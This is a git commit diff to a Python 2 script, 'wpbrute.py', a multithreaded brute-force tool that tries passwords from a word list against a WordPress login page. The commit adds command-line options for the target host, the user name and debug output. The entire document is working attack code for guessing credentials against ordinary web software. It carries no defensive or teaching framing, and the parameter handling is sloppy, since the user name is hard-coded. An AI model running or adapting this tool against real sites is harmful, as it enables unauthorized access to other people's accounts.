db7bb27fa342b602de3d3da27c2179dd5eef2277
Adrian St. Onge <astonge@gmail.com>
2017-10-11 11:36:22 -0700

    update to cmd line args, added changeable hosts

--- wpbrute.py
+++ wpbrute.py
@@ -4,21 +4,22 @@ from threading import Thread
 from Queue import Queue
 import requests
 import itertools
-import argparse
+import optparse
 import re
 
 import time
 import signal
 import sys
 
-def check_pass(passwords, threadNum, timing, q):
-	user = "admin"
+def check_pass(passwords, url, user, threadNum, timing, q, debug):
+	user = "bob"
 	regex = ur"<strong>ERROR</strong>"
-	url="http://doom:8000/wp-login.php"
+	#url="http://10.10.1.29:8000/wp-login.php"
 	global RUNNING
 	RUNNING = True
 
-	### print "Worker %d: trying %d passwords" % (threadNum, len(passwords))
+	if(debug):
+		print "Worker %d: trying %d passwords" % (threadNum, len(passwords))
 	for i in range(len(passwords)):
 
 		payload = {'log':user, 'pwd':passwords[i],'wp-submit':'Log In'}
@@ -26,20 +27,25 @@ def check_pass(passwords, threadNum, timing, q):
 		# FIXME check error codes from request.
 
 		if re.search(regex,r.text) == None:
-			# No match found, password worked! Tell the others!
+			if (debug):
+				print "No match found, password worked! Tell the others!"
+
 			print "Worker %d found a password: %s" % (threadNum, passwords[i])
 			RUNNING = False
 		else:
 			# Match found. Password was wrong.
-			#print "No match."
+			if (debug):
+				print "No match."
 			pass
 
-		# Match was found, lets shut this circus down!
 		if RUNNING == False:
+			if (debug):
+				print "Match was found! Lets shut this circus down!"
 			return
 
 		#time.sleep(1)
-	### print "Worker %d done." % (threadNum)
+	if(debug):
+		print "Worker %d done." % (threadNum)
 
 def shutdown(signal, frame):
 	print "Shutting down threads.."
@@ -57,27 +63,31 @@ def main(argv):
 	signal.signal(signal.SIGINT, shutdown)
 
 	# command line arguments
-	parser = argparse.ArgumentParser(description="Wordpress Login Brute Forcer")
-	parser.add_argument('-t', action="store", dest="threads", nargs=1, type=int, help="How many threads to spawn.")
-	parser.add_argument('-f', action="store", dest="password_file", nargs=1, help="Provided password file.")
-	parser.add_argument('-n', action="store", dest="seconds", nargs=1, type=int, help="Thread timing value.")
+	parser = optparse.OptionParser()
+	parser.add_option('-t', action="store", dest="threads", nargs=1, type=int, help="How many threads to spawn.")
+	parser.add_option('-f', action="store", dest="password_file", nargs=1, help="Provided password file.")
+	parser.add_option('-n', action="store", dest="seconds", nargs=1, type=int, help="Thread timing value.")
+	parser.add_option('-u', action="store", dest="user", nargs=1, help="User name to login with (default: admin)")
+	parser.add_option('-a', action="store", dest="host", nargs=1, help="Hostname of target")
+	parser.add_option('-d', action="store_true", dest="debug", default=False, help="Display debuggin strings")
+	(results, args) = parser.parse_args()
 
-	results = parser.parse_args()
-	if (results.password_file):
-		#print "Using password file %s" % (results.password_file[0])
-		PASSWORDS = results.password_file[0]
+	if (results.password_file or results.host):
+		if (results.debug):
+			print "Using password file %s" % (results.password_file)
+		PASSWORDS = results.password_file
 	else:
 		print "No password file.."
 		sys.exit(-1)
 
 	if (results.threads):
-		THREADS = results.threads[0]
+		THREADS = results.threads
 	else:
 		print "Using default 20 workers.."
 
 	if (results.seconds):
-		print "Pausing %d seconds between each login attempt." % (results.seconds[0])
-		TIMING = results.seconds[0]
+		print "Pausing %d seconds between each login attempt." % (results.seconds)
+		TIMING = results.seconds
 
 	# how many lines are we dealing with?
 	num_lines = sum(1 for line in open(PASSWORDS))
@@ -98,11 +108,15 @@ def main(argv):
 	password_lines = chunks(lines, len(lines)/THREADS)
 	print "Using average size of %d passwords/worker" % (len(password_lines[0]))
 
+	attack_url = "http://%s/wp-login.php" % results.host
+	if (results.debug):
+		print attack_url
+
 	# Fire off worker threads with each chunk.
 	print "Starting %d Workers.. press Ctrl+C to stop." % (THREADS)
 	for worker_number in range(len(password_lines)):
 		# send to thread
-		t = Thread(target=check_pass, args=(password_lines[worker_number],worker_number,TIMING,q))
+		t = Thread(target=check_pass, args=(password_lines[worker_number], attack_url, "admin", worker_number,TIMING,q, results.debug))
 		t.start()
 
 if __name__ == "__main__":
